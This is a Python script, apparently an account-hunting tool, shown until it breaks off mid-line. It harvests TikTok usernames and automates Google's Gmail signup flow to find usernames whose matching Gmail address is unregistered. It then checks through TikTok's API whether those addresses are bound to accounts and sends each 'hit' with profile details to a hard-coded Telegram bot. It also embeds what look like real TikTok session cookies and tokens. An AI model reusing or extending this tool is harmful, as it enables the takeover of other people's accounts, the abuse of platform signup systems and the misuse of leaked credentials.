from requests import get,post
from random import choice,randrange
from threading import Thread
import os,sys
import http.client
import requests
import re
from time import time
from user_agent import generate_user_agent
from random import choice,randrange
from requests import get
import urllib.parse
import re



class qredes:
  def __init__(self):
    self.good_tiktok=0
    self.bad_tiktok=0
    self.good_gmail=0
    self.bad_gmail=0
    self.nudes=[]
    self.hits=[]
    self.list=[]
    self.cok=[]
    self.ttwids=[]
    self.msTokens=[]
    self.search1(''.join(choice('1234567890_qwertyuiopasdfghjklzxcvbnm') for _ in range(randrange(4,23))))
    self.check_tokens()
    os.system('clear' if os.name == 'posix' else 'cls')
    self.token='7491980936:AAGHEtcBLDRDylg6ILKbpl5SEYRxFy9Xb0Q'
    os.system('clear' if os.name == 'posix' else 'cls')
    self.id='5504531780'
    os.system('clear' if os.name == 'posix' else 'cls')
    for _ in range(20):
      Thread(target=self.home).start()
  def check_text(self,text):
        return bool(re.search(r'[^a-zA-Z0-9.]', text))
  def search1(self,keyword):
        data = {
            'keyword': urllib.parse.quote(keyword),
        };url=choice(['https://pjeoihfdiu-884a8a0b86cd.herokuapp.com/','https://ofpofiufi-37b50915eeee.herokuapp.com/','https://ofijofihif-67266710ad05.herokuapp.com/'])
        while True:
            try:
                try:
                    cookies=self.cok[len(self.cok)-1]
                except:
                    while True:
                        try:
                            response=requests.get(url,data=data).json()
                            self.cok.append(response['cookies'])
                            return response['response']
                        except Exception as e:''
                for _ in range(3):
                    try:
                        response=requests.get(url,data=data,cookies=cookies).json()
                        self.cok.append(response['cookies'])
                        return response['response']
                    except Exception as e:''
                while True:
                    try:
                        response=requests.get(url,data=data).json()
                        self.cok.append(response['cookies'])
                        return response['response']
                    except Exception as e:''
            except Exception as e:''

  def get_users(self):
    while True:
      try:
        g=choice(
            [
                '1234567890_qwertyuiopasdfghjklzxcvbnm', 
                '1234567890_qwertyuiopasdfghjklzxcvbnm',
                '1234567890_qwertyuiopasdfghjklzxcvbnm',
                '1234567890_qwertyuiopasdfghjklzxcvbnm',
                '1234567890_qwertyuiopasdfghjklzxcvbnm',
                'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',  
                'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',
                'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',
                'abcdefghijklmnopqrstuvwxyzñ',  
                'abcdefghijklmnopqrstuvwxyzñ',
                'abcdefghijklmnopqrstuvwxyzñ',
                'абвгдеёжзийклмнопрстуфхцчшщъыьэюя',  
                'абвгдеёжзийклмнопрстуфхцчшщъыьэюя',
                'абвгдеёжзийклмнопрстуфхцчшщъыьэюя',
                '的一是不了人我在有他这为之大来以个中上们到说时国和地要就出会可也你对生能而子那得于着下自之',  
                '的一是不了人我在有他这为之大来以个中上们到说时国和地要就出会可也你对生能而子那得于着下自之',
                '的一是不了人我在有他这为之大来以个中上们到说时国和地要就出会可也你对生能而子那得于着下自之',
                'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン',  
                'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン',
                'あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん', 
                'あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん',
                'אבגדהוזחטיכלמנסעפצקרשת',
                'אבגדהוזחטיכלמנסעפצקרשת',
                'دجحخهعغفقثصضشسيبلاتنمكطظزوةيارؤءئ',
                'دجحخهعغفقثصضشسيبلاتنمكطظزوةيارؤءئ',
                'αβγδεζηθικλμνξοπρστυφχψω',  
                'αβγδεζηθικλμνξοπρστυφχψω',
                'abcdefghijklmnopqrstuvwxyzç', 
                'abcdefghijklmnopqrstuvwxyzç',
                'กขฃคฅฆงจฉชซฌญฎฏฐฑฒณดตถทธนบปผฝพฟภมยรฤฤลฦวศษสหฬอฮ',  
                'กขฃคฅฆงจฉชซฌญฎฏฐฑฒณดตถทธนบปผฝพฟภมยรฤฤลฦวศษสหฬอฮ',
                'अआइईउऊऋएऐओऔअंअःकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसहक्षत्रज्ञ',  
                'अआइईउऊऋएऐओऔअंअःकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसहक्षत्रज्ञ',
            ]

        )
        keyword=''.join((choice(g) for i in range(randrange(3,9))))
        return self.search(keyword)
      except Exception as e:''
  def search(self,keyword):
        while True:
            try:
                users_po=[]
                for users in self.search1(keyword)['user_list']:
                    username=users['user_info']['unique_id']
                    follower_count=users['user_info']['follower_count']
                    if 0 == 0:
                        if '_' not in username:
                            if username not in self.list:
                                if 5 < len(username):
                                    if self.check_text(username) == False:
                                        users_po.append(username)
                                        self.list.append(username)
                return users_po
            except Exception as e:''

  def gg00(self):
        ua=str(generate_user_agent())
        time0=time()
        conn = http.client.HTTPSConnection('accounts.google.com')
        while True:
            try:
                headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'referer': 'https://accounts.google.com/',
        'user-agent': ua,
    }
                conn.request(
        'GET',
        '/lifecycle/flows/signup?biz=false&flowEntry=SignUp&flowName=GlifWebSignIn&followup=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&osid=1&service=mail',
        headers=headers
    )
                response = conn.getresponse().info()
                __Host_GAPS=str(response).split('Set-Cookie: __Host-GAPS=')[1].split(';')[0]
                tl=str(response).split('TL=')[1].split('\n')[0]
                break
            except Exception as e:''
        while True:
            try:
                cookies = {
        '__Host-GAPS': __Host_GAPS,
    }
                headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'referer': 'https://accounts.google.com/',
        'user-agent':  ua,
    }
                response = requests.get(
        'https://accounts.google.com/lifecycle/steps/signup/name?emr=1&flowEntry=SignUp&flowName=GlifWebSignIn&followup=https://mail.google.com/mail/u/0/&osid=1&service=mail&TL='+tl,
        cookies=cookies,
        headers=headers,
    )
                tok=re.findall(r'"(.*?)"',str(response.text).split('<!doctype html')[1].split('/lifecycle/_/AccountLifecyclePlatformSignupUi/')[0])
                hl=tok[0]
                s1=tok[28]
                at=tok[33]
                break
            except Exception as e:''
        while True:
            try:
                name=''.join(choice('1234567890_qwertyuiopasdfghjklzxcvbnm') for i in range(randrange(4,23)))
                cookies = {
        '__Host-GAPS': __Host_GAPS,
    }
                headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'origin': 'https://accounts.google.com',
        'referer': 'https://accounts.google.com/',
        'user-agent': ua,
        'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
        'x-goog-ext-391502476-jspb': '["'+s1+'","mail"]',
        'x-same-domain': '1',
    }
                params = {
        'rpcids': 'E815hb',
        'source-path': '/lifecycle/steps/signup/name',
        'hl': hl,
        'TL': tl,
    }
                data = 'f.req=%5B%5B%5B%22E815hb%22%2C%22%5B%5C%22'+name+'%5C%22%2C%5C%22%5C%22%2C0%2C%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2C0%2C1%2C%5C%22%5C%22%2Cnull%2Cnull%2C2%2C2%5D%2Cnull%2C%5B%5D%2C%5B%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2C%5C%22mail%5C%22%5D%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at='+at+'&'
                response = requests.post(
        'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
        params=params,
        cookies=cookies,
        headers=headers,
        data=data,
    )
                break
            except Exception as e:''
        while True:
            try:
                yaer=str(randrange(1980,2007))
                month=str(randrange(1,12))
                day=str(randrange(1,28))
                cookies = {
        '__Host-GAPS': __Host_GAPS
    }
                headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'origin': 'https://accounts.google.com',
        'referer': 'https://accounts.google.com/',
        'user-agent': ua,
        'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
        'x-goog-ext-391502476-jspb': '["'+s1+'","mail"]',
        'x-same-domain': '1',
    }
                params = {
        'rpcids': 'eOY7Bb',
        'source-path': '/lifecycle/steps/signup/birthdaygender',
        'hl': hl,
        'TL': tl,
    }

                data = 'f.req=%5B%5B%5B%22eOY7Bb%22%2C%22%5B%5B'+yaer+'%2C'+month+'%2C'+day+'%5D%2C1%2Cnull%2C0%2C%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2C0%2C1%2C%5C%22%5C%22%2Cnull%2Cnull%2C2%2C2%5D%2C%5C%22%3CiUVqRR0CAAZTFvCGcxaNEqaeSioWmer0ADQBEArZ1AbW8EaBzfF11OToJc8rVRf567WhHSsHVMS0KPTiaZwr5pRNxLkK9RFieh5kZPBxzQAAAfCdAAAACKcBB7EAR5bLmW4_pyTl0q5GLHZl4BUTtf5jKTDjvxJk-VC9uNwzsTszdq9QTwfQ0_DHYWRUQ5D-0Q7wlf8WYIT1MtRwAzJlzeQGANesVgivzo24pJLwbK5u09y-72TKV70_6M1xVh6LwwBKoiUNY7W10Ng--cONycFdiuW5-9A6YPDsVqeQjqoACYUa5myX0nOSoLdgirK3Dee6DPRA24QuCxHZdbPJw9ftTchvQHfPacZ2qTX75RGo2yPbKidai5QfBmaQnPDEpAO6vPu0OkTykd1WQUEQQMhO8uLWnPtqnEzJRwVYHYo8JSRIdx3227TV7CmTonE1PHiZPyPb8zB0LHwFrgAhjTUS2edAfguaYgQQS5A1tWvNaGEoeBxrc-B0q_cPQkfrJbCBsCVe6nTN3SZx2QrDfKuc9Z8vOg7OCCkIv98DFRBbJr0WJueIAuIWpCqXyIOpsMyVWHVcgoGiQWLGYzigfAmY47zxxt0CPKslU2gVH5ZzCnEAtfzlG5oG50mS94lg9QEWfIeQkghJ8KXp8SUUnu3mVLKATFn_Ju9AKekgoHGu4gjDfzxzM4MStJojZS98bAVPhagqvp-UCIpAu4Ym7egIqFexR_YNTmxXPbpNHPFYv6FN9k2RDS1WLYxT4N7TzgtWJGc-GF9YZbGzpaeTjbO2_-0GSPX9tmael40o0E-ocd6OxEISENG_ZQTMWxWZzPdYNXxJOD5yAUpbZJR_0WBRk_bA5-PXX6hpA7TvwclDq77YLxWTeVKVmrYDPTPfVc3uAUOrMPV2J565-m9UJ1zqrXALM0fwdfyQPEN4K9hrn9l5U6UJMK18_C349ioqL5kz_yeyj1fKtnDqNlQjkD-xrAfEDqiDAfYhjaFRn9mdymFELdQSWhHCD8ItfapoezIH8OB_wYUKnJiJ76yiweU3h4AV1RxNKDEcIsRVixEyLwSRrl-UsP-MSM8LflbsVQbuiwLQLEbJLFMSlolNVvrlWWgOaWMyhVz6yay4dgiaUustS2xqooWiKyeVMlyDFrwQ092qxBkmsKLqgtVOVInzdW6gNiA79rxALtZXsrlSG1xnSbwwiGpxU7qLqUMqb5taN6_RCnzS7gRztKjP_Nxcm2VZe9e-UsIbaFXduTbvYrfELi_21Cwr3mgYvu5nOwK-_lpFPcRAn35xw5K15hZpyAZ0DHJVvWb2MjDNNJiQC9JEexsN4QHBnNRWi4JazEmrhoBPRVcQ970qOY5ayuAFAWbV3P1QUmi5KRHzYVvPBXDyYUK4-Txd5RYKgg1DUxlWAQUXHQJ3pHwLPVwN3QxGM5BWcW2716AhrcPWzn7YvLrYJ1oauQSMKtJw9bNLhnVibIRVJ2epZnPQN3jg3bEqMn5NHj50cUFpF9qe1VlmHd0x7eQsXkGIVUYh5d-mwkOuZ_B-zSW0ifIq5Bf1mXKF9JgyAW8dhETFqXH-a_gjiyAS2BEefo-i3TwaeuAwyh4F6aP-nh168NrICOLZQ92jk3xkk7gYjF_bvxsYwPyz1YRL2n7N1PQAHRdCkqAcjaJ90ieUUNTPwtiFqIhglzrf3GGMHpggdViRoeAzPMlO-ENtQhPqWwWfqnVMkHSLxlU-cfLVPap97ZBQNlNY4_D9zu722n-eOPRrXo53yyx-OXpb3qqFb7y7UR4cYCmXxj0FWTl-RWpnUyxLUwicH2MnhsDaJWBA54fRvNI4nOY8f5VyVBXfaXgLQwJqNrRGcFtLO8Lg1xvHIKDTV_zrz9D168CndnByIESfYOC0OkLt-WBmYbTmNiiHwS7dg8pHngFY389zqAq5ytk4HcyhOtmUgpx2YVIYuVpKh7p78Z8SdBVMyvztqXliq7uwtR8-FJcb0C-CEdDCmdDNB3Hpzkf-1WQGIAqNJjrUz9h6VWJYxmTgc_XPm2s-yk77e5fa9OJ4xjOHeseNtGYhen6gWmNMbh60fl9eemdfE0Fkgp3Hs7MsPkciPLfSFR_xsW8nIVaQEZJSISY-dC0klZTNK2SpWolbZ854i1ErGQCc_3HBh0hIlsPJrqcoPDlmhHs-1Iqtr18aJyfNU_7Iq-IqE9sy0dLVRowqFqFSnDKcv2BjvBF0atL2e6HcXhIQtMZlUKVUl8-GlyO1wqPZrwBY6Y-VWSie93XEcz5oUunkDkTM9P9ZTiLQKQdknPD7Xtis-nkyGya1UtnF-IChRpMnBfaW9V790HZFYD6PKJ15nVIKj42gibtzuK7ssA-3WJwSwA0fKpeT_73UPoa6HE4oE7bhcjzo9ksAOAp99PAuHnJh0J4rIiCeEU7tSbFK2Pw67VuGjI4N9X0j7k0GLzeI688KPB2DGurMp-LvC2IG9CtMQ640NEqeL0E1TxIxx96o0Ei7CyL4Q2QG_FacW0ARHSWSxiR0csbEfl4df9woMkq2kS3MNGmw4kqr0traabbonvPGzXCpuoOSIPwSAbmSPycOrOITw8TgIN5VRiAqm6_SiCsSrukPXsJNk7qRfa4jLW72QUxT7qQILT3G3SPVLYotsWTmpSesKuwYooo4s5Sb4cIXDDDVB4GKYuDmPvSaaa-QLfXeQgzxHLcI_dLHTGn7wWI8zdbghSkdQUIWw3jZvg0uFHjut66bQOSPGeZMP7XWOZtZRdDgesg8pQ9R-5_yAhQc67C1CryDKkJk5CP-f8Qky3afIppWOH_oPYaLFzW5Da_be-b3jc4qVxlr3_QYH9xQh0JY4Ov1OwFW8BVLCxuILcmtcxo3Gdlx6j-E73w570E6P_kvuoxx8cYzz5XYamgXz616GpYv6W428iFKuWJea29by1EczNDyuZaWBPc0K0j4XU83JYN0qI-yapNGwUj9xg9D5_xrtQRLruSyEjym8_k_kdUNoN4-y_FzIeygIvPEx3sUioZcpSNDzDbI_dmCFFtHzRxlNVRJ4ztU3vHyO3nAPXt2PrvbJ9e82zeqcYv3z5nbKwr8utji-szOrqg4gKCGm4LVSlgKyWz2C8ZmkTy5VYWBbScWuYTwxb_6GXZW4pcDJIVbtjALx9xDHj4LTHv52ufuhThsXq60u2RQmXaR%5C%22%2C%5Bnull%2Cnull%2C%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5C%22mail%5C%22%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at='+at+'&'
                response = requests.post(
        'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
        params=params,
        cookies=cookies,
        headers=headers,
        data=data,
    )
                break
            except Exception as e:''
        tm=time()-time0
        try:
            return {
                'tokens':{
                    '__Host-GAPS':__Host_GAPS,
                    'TL':tl,
                    'hl':hl,
                    'at':at,
                    's1':s1,
                },
                'info':{
                    'name':name,
                    'birthday':{
                        'day:month:year':day+':'+month+':'+yaer,
                        'day':day,
                        'month':month,
                        'year':yaer,
                    },
                    'time_get_tokens':tm,
                    'time':time(),
                    'by':'@Qredes - https://t.me/Qredes_Tools'
                        },
                'errors':[],
            }
        except:
            return {
                'errors':['error get tokens'],
                'tokens':{

                },
                'info':{
                    'by':'@Qredes - https://t.me/Qredes_Tools',
                    'time':time(),
                    'time_get_tokens':tm,
                },
            }

  def check_linked(self,email):
    email = str(email)
    while True:
      try:
          token = "03b312f34e03844c764c85db6034335f9b004fda70ef818d5091f1675df8d3dfdb16f38d56d8ee71b3b2480fa76d885e44ba9bcf3a6d5fc4f69e883f5f6a5865b12197d5bc163fa7cde9cb24ec0cde4565883ecfdaf86aca2fd03075f36b557209e9a-CkA4NjIyZTY4ZjY2NmU5Mjc4NWMxNGM5NzAwOGY5Zjc3ODQyNjk2M2I0NTFiZTJlOTQzNzYyOWY5MDAwOWNhMGNj-2.0.0"
          res = requests.post('https://api22-normal-c-alisg.tiktokv.com/passport/email/bind_without_verify/?aid=1233',headers={"x-tt-token":token,"sdk-version":"2"},data={"email": email}).text
          if "Email is linked to another account. Unlink or try another email." in res:
              return True
          else:
              return False
      except Exception as e:''
  def get_tokens(self):
      while True:
        try:
          g=self.gg00()['tokens']
          TL=g['TL']
          __Host_GAPS=g['__Host-GAPS']
          at=g['at']
          hl=g['hl']
          s1=g['s1']
          try:
            os.remove(f'tokens.txt')
          except:''
          with open(f'tokens.txt','a') as a:
            a.write(f'{TL}///{__Host_GAPS}///{at}///{hl}///{s1}')
          return 
        except Exception as e:''
  def check_tokens(self):
      while True:
        try:
          try:
            o=open('tokens.txt','r').read().splitlines()[0].split('///')
            TL=o[0]
            __Host_GAPS=o[1]
            at=o[2]
            hl=o[3]
            s1=o[4]
          except Exception as e:
            self.get_tokens()
            return
          email=''.join(choice('1234567890_qwertyuiopasdfghjklzxcvbnm1234567890.') for i in range(randrange(10,15)))
          cookies = {
              '__Host-GAPS': __Host_GAPS,
          }

          headers = {
              'accept': '*/*',
              'accept-language': 'en-US,en;q=0.9',
              'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
              'origin': 'https://accounts.google.com',
              'priority': 'u=1, i',
              'referer': 'https://accounts.google.com/',
              'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
              'sec-ch-ua-arch': '"x86"',
              'sec-ch-ua-bitness': '"64"',
              'sec-ch-ua-form-factors': '"Desktop"',
              'sec-ch-ua-full-version': '"112.0.5197.39"',
              'sec-ch-ua-full-version-list': '"Not/A)Brand";v="8.0.0.0", "Chromium";v="126.0.6478.183", "Opera";v="112.0.5197.39"',
              'sec-ch-ua-mobile': '?0',
              'sec-ch-ua-model': '""',
              'sec-ch-ua-platform': '"Windows"',
              'sec-ch-ua-platform-version': '"10.0.0"',
              'sec-ch-ua-wow64': '?0',
              'sec-fetch-dest': 'empty',
              'sec-fetch-mode': 'cors',
              'sec-fetch-site': 'same-origin',
              'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
              'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
              'x-goog-ext-391502476-jspb': '["{}"]'.format(s1),
              'x-same-domain': '1',
          }

          params = {
              'rpcids': 'NHJMOd',
              'source-path': '/lifecycle/steps/signup/username',
              'f.sid': '-794764349027196993',
              'bl': 'boq_identity-account-creation-evolution-ui_20240731.08_p0',
              'hl': hl,
              'TL': TL,
              '_reqid': '648808',
              'rt': 'c',
          }

          data = 'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C8420%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(email,at)

          response = post(
              'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
              params=params,
              cookies=cookies,
              headers=headers,
              data=data,
          ).text
          if 'password' in response:
            return
          else:
            self.get_tokens()
            return
        except Exception as e:''
  def check_gmail(self,email):
      while True:
        try:
          if '@' in email:email=email.split('@')[0]
          self.check_tokens()
          o=open('tokens.txt','r').read().splitlines()[0].split('///')
          TL=o[0]
          __Host_GAPS=o[1]
          at=o[2]
          hl=o[3]
          s1=o[4]
          cookies = {
              '__Host-GAPS': __Host_GAPS,
          }

          headers = {
              'accept': '*/*',
              'accept-language': 'en-US,en;q=0.9',
              'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
              'origin': 'https://accounts.google.com',
              'priority': 'u=1, i',
              'referer': 'https://accounts.google.com/',
              'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
              'sec-ch-ua-arch': '"x86"',
              'sec-ch-ua-bitness': '"64"',
              'sec-ch-ua-form-factors': '"Desktop"',
              'sec-ch-ua-full-version': '"112.0.5197.39"',
              'sec-ch-ua-full-version-list': '"Not/A)Brand";v="8.0.0.0", "Chromium";v="126.0.6478.183", "Opera";v="112.0.5197.39"',
              'sec-ch-ua-mobile': '?0',
              'sec-ch-ua-model': '""',
              'sec-ch-ua-platform': '"Windows"',
              'sec-ch-ua-platform-version': '"10.0.0"',
              'sec-ch-ua-wow64': '?0',
              'sec-fetch-dest': 'empty',
              'sec-fetch-mode': 'cors',
              'sec-fetch-site': 'same-origin',
              'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
              'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
              'x-goog-ext-391502476-jspb': '["{}"]'.format(s1),
              'x-same-domain': '1',
          }

          params = {
              'rpcids': 'NHJMOd',
              'source-path': '/lifecycle/steps/signup/username',
              'f.sid': '-794764349027196993',
              'bl': 'boq_identity-account-creation-evolution-ui_20240731.08_p0',
              'hl': hl,
              'TL': TL,
              '_reqid': '648808',
              'rt': 'c',
          }

          data = 'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C8420%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(email,at)

          response = post(
              'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
              params=params,
              cookies=cookies,
              headers=headers,
              data=data,
          ).text
          if 'password' in response:
            return True
          else:
            return False
        except Exception as e:''
  def info(self,username):
    try:
      if username in self.hits:
        return
      self.hits.append(username)
      inf=self.information(username)
      ff = (f'''

    𝐇𝐈𝐓 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 𝐓𝐈𝐊𝐓𝐎𝐊
    ═══════════════════
    𝑷𝑹𝑶𝑮𝑹𝑨𝑴 : @d_dwu | @Qredes
    ═══════════════════
    𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 : {username}
    𝙶𝙼𝙰𝙸𝙻 : {username}@gmail.com
    𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂 : {inf['followers']}
    𝙵𝙾𝙻𝙻𝙾𝙸𝙽𝙶 : {inf['following']}
    𝙻𝙸𝙺𝙴 : {inf['like']}
    𝙸𝙳 : {inf['id']}
    𝙿𝚁𝙸𝚅𝙰𝚃𝙴 : {inf['private']}
    𝚅𝙴𝙳𝙾 : {inf['video']}
    𝙲𝙾𝚄𝙽𝚃𝚁𝚈 𝙽𝙰𝙼𝙴 : {inf['country_name']}
    𝙵𝙻𝙰𝙶 : {inf['flag']}
    𝙽𝙰𝙼𝙴 : {inf['name']}
    𝙱𝙸𝙾 : {inf['bio']}
    ═══════════════════

     ''')
    except:
      ff=f'''

      𝐇𝐈𝐓 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 𝐓𝐈𝐊𝐓𝐎𝐊
      ═══════════════════
      𝑷𝑹𝑶𝑮𝑹𝑨𝑴 : @d_dwu | @Qredes
      ═══════════════════
      𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 : {username}
      𝙶𝙼𝙰𝙸𝙻 : {username}@gmail.com
      ═══════════════════

      '''
    while True:
      try:
        get('https://api.telegram.org/bot'+self.token+'/sendMessage?chat_id='+self.id+'&text='+ff)
        return
      except:''
  def get_country_info(self,country_code):
      try:
          url = f"https://restcountries.com/v3.1/alpha/{country_code}"
          response = requests.get(url)
          country_data = response.json()[0]
          country_name = country_data['name']['common']
          flag = country_data['flag']        
          return country_name, flag
      except:
          return '',''

  def information(self,username):
    try:
        headers = {
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Android 10; Pixel 3 Build/QKQ1.200308.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/125.0.6394.70 Mobile Safari/537.36 trill_350402 JsSdk/1.0 NetType/MOBILE Channel/googleplay AppName/trill app_version/35.3.1 ByteLocale/en ByteFullLocale/en Region/IN AppId/1180 Spark/1.5.9.1 AppVersion/35.3.1 BytedanceWebview/d8a21c6",
            }

        try:
            tikinfo = get(f'https://www.tiktok.com/@{username}', headers=headers).text            
            info = str(tikinfo.split('webapp.user-detail"')[1]).split('"RecommendUserList"')[0]
            try:
                name = str(info.split('nickname":"')[1]).split('",')[0]
            except:
                name = ""
            try:
                followers = str(info.split('followerCount":')[1]).split(',"')[0]
            except:
                followers = ""
            try:
                following = str(info.split('followingCount":')[1]).split(',"')[0]
            except:
                following = ""
            try:
                like = str(info.split('heart":')[1]).split(',"')[0]
            except:
                like = ""
            try:
                video = str(info.split('videoCount":')[1]).split(',"')[0]
            except:
                video = ""
            try:
                id = str(info.split('id":"')[1]).split('",')[0]
            except:
                id = ""                
            try:
                bio = str(info.split('signature":"')[1]).split('",')[0]
            except:
                bio = ""
            try:
                country = str(info.split('region":"')[1]).split('",')[0]
            except:
                country = ""
            try:
                private = str(info.split('privateAccount":')[1]).split(',"')[0]
            except:
                private = ""                 
            try:
                country = str(info.split('region":"')[1]).split('",')[0]
            except:
                country = ""
            try:
                private = str(info.split('privateAccount":')[1]).split(',"')[0]
            except:
                private = ""  
            try:
               country_name, flag = self.get_country_info(country)
            except:
                country_name, flag = '',''
            return {                                    
                "name": name,
                "username": username,
                "followers": followers,
                "following": following,
                "like": like,
                "video": video,
                "private": private,
                "id": id,
                "bio": bio,
                "country_name": country_name,
                "flag":flag,
                "BY": "@g_4_q"
            }
        except:
          return {                                    
              "name": '',
              "username": '',
              "followers": '',
              "following": '',
              "like": '',
              "video": '',
              "private": '',
              "id": '',
              "bio": '',
              "country_name": "",
              "flag":"",
              "BY": "@g_4_q"
          }
    except :
        return {                                    
              "name": '',
              "username": '',
              "followers": '',
              "following": '',
              "like": '',
              "video": '',
              "private": '',
              "id": '',
              "bio": '',
              "country_name": "",
              "flag":"",
              "BY": "@g_4_q"
          }
  def get_following(self,username,id):
      while True:
                try:
                      usernames=[]
                      uid = "".join(choice('1234567890')for i in range(18))
                      url = f'https://api2-19-h2.musical.ly/aweme/v1/user/following/list/?user_id={id}&sec_user_id={username}=1694591114&count=200&offset=0&source_type=2&address_book_access=2&gps_access=2&manifest_version_code=2019081160&_rticket=1694591805386&app_language=ar&current_region=IQ&app_type=normal&iid=7278211504247604997&channel=googleplay&device_type=Infinix%20X692&language=ar&locale=ar&resolution=720*1464&openudid=b32f27a32b0e1880&update_version_code=2019081160&sys_region=EG&os_api=29&uoo=0&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=320&residence=IQ&carrier_region=IQ&ac=wifi&device_id=7149927891131893254&pass-route=1&mcc_mnc=41820&os_version=10&timezone_offset=10800&version_code=120603&carrier_region_v2=418&app_name=musical_ly&ab_version=12.6.3&version_name=12.6.3&device_brand=Infinix&ssmix=a&pass-region=1&device_platform=android&build_number=12.6.3&region=EG&aid=1233&ts=1694591805'
                      he = {
                          'Host': 'api2-19-h2.musical.ly', 'Connection': 'keep-alive', 
                          'Cookie': 'passport_csrf_token_default=621d779700f3a5e1c16e847f556de1cf; odin_tt=866be507765a947edcd21b15da40c33f3ec663cb56a5b8f17c4cbc59501c8cdc11443e8b5f7613a3e1eeeaf9c5c5c626ba9d9371661dafbd1715044506eea452becf1c641da7911b51d360267627beb1; d_ticket=b74d11501bf12e69ef3a14403dd9b53a6e0ef; sid_guard=75cd6d4793949f0c1fbffbbf214bd8f3%7C1694590737%7C15552000%7CMon%2C+11-Mar-2024+07%3A38%3A57+GMT; uid_tt=f24ebc81f26b3bbb139120e2a1fd84079edcdd9f0ef437207295174d90d81ac2; sid_tt=75cd6d4793949f0c1fbffbbf214bd8f3; sessionid=75cd6d4793949f0c1fbffbbf214bd8f3; store-idc=maliva; store-country-code=iq; store-country-code-src=uid ', 'Accept-Encoding': 'gzip ', 'X-Tt-Token': 